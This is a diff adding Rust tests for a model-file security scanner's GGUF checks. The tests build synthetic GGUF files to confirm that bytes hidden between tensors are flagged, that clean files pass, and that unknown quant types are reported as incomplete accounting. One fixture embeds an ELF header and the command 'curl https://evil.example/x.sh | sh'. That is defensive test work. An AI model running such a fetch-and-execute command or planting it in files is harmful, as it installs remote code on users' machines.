@@ -1197,3 +1197,95 @@ fn a_hugging_face_token_in_a_sibling_config_is_found() {
     assert!(!out.contains(&token), "{out}");
     let _ = std::fs::remove_dir_all(&dir);
 }
+
+// ===========================================================================
+// GGUF byte accounting
+// ===========================================================================
+
+/// A complete GGUF file: header, tensor info, alignment padding, data.
+fn gguf_file(specs: &[(&str, u32, Vec<u64>, u64)], data: &[u8]) -> Vec<u8> {
+    let mut buf = Vec::new();
+    buf.extend_from_slice(b"GGUF");
+    buf.extend_from_slice(&3u32.to_le_bytes());
+    buf.extend_from_slice(&(specs.len() as u64).to_le_bytes());
+    buf.extend_from_slice(&0u64.to_le_bytes());
+    for (name, type_id, dims, offset) in specs {
+        buf.extend_from_slice(&(name.len() as u64).to_le_bytes());
+        buf.extend_from_slice(name.as_bytes());
+        buf.extend_from_slice(&(dims.len() as u32).to_le_bytes());
+        for d in dims {
+            buf.extend_from_slice(&d.to_le_bytes());
+        }
+        buf.extend_from_slice(&type_id.to_le_bytes());
+        buf.extend_from_slice(&offset.to_le_bytes());
+    }
+    while buf.len() % 32 != 0 {
+        buf.push(0);
+    }
+    buf.extend_from_slice(data);
+    buf
+}
+
+/// The same invariant as safetensors, on the format people actually run
+/// locally: a payload wedged between two tensors must not scan clean.
+#[test]
+fn a_payload_hidden_in_a_gguf_gap_fails_the_gate() {
+    let dir = tmpdir("gguf-gap");
+    let mut data = vec![0u8; 16];
+    data.extend_from_slice(b"\x7fELFcurl https://evil.example/x.sh | sh");
+    data.resize(80, 0);
+    data.extend_from_slice(&[0u8; 16]);
+    let p = write(
+        &dir,
+        "model.gguf",
+        &gguf_file(&[("a", 0, vec![4], 0), ("b", 0, vec![4], 80)], &data),
+    );
+
+    let (code, out) = run(&["scan", p.to_str().unwrap(), "--fail-on", "high"]);
+    assert_eq!(code, 1, "hidden bytes must fail the gate\n{out}");
+    assert!(out.contains("GGUF_UNREFERENCED_BYTES"), "{out}");
+    assert!(out.contains("an ELF executable"), "{out}");
+    assert!(out.contains("UNTRUSTED"), "{out}");
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// A normally packed GGUF, including its alignment padding, stays silent.
+#[test]
+fn a_well_formed_gguf_stays_clean() {
+    let dir = tmpdir("gguf-clean");
+    let p = write(
+        &dir,
+        "model.gguf",
+        &gguf_file(&[("a", 0, vec![4], 0), ("b", 0, vec![4], 32)], &[0u8; 48]),
+    );
+
+    let (code, out) = run(&["scan", p.to_str().unwrap(), "--fail-on", "high"]);
+    assert_eq!(code, 0, "{out}");
+    assert!(
+        !out.contains("GGUF_UNREFERENCED_BYTES"),
+        "false positive:\n{out}"
+    );
+    assert!(out.contains("CLEAN"), "{out}");
+    let _ = std::fs::remove_dir_all(&dir);
+}
+
+/// When the type layout is unknown, the report admits it rather than
+/// inventing findings about bytes it cannot place.
+#[test]
+fn an_unknown_quant_type_is_an_admission_not_an_accusation() {
+    let dir = tmpdir("gguf-iq");
+    let p = write(
+        &dir,
+        "model.gguf",
+        &gguf_file(
+            &[("a", 23, vec![256], 0), ("b", 0, vec![4], 4096)],
+            &[0u8; 8192],
+        ),
+    );
+
+    let (code, out) = run(&["scan", p.to_str().unwrap(), "--fail-on", "high"]);
+    assert_eq!(code, 0, "an admission is not a failure\n{out}");
+    assert!(out.contains("GGUF_ACCOUNTING_INCOMPLETE"), "{out}");
+    assert!(!out.contains("GGUF_UNREFERENCED_BYTES"), "{out}");
+    let _ = std::fs::remove_dir_all(&dir);
+}
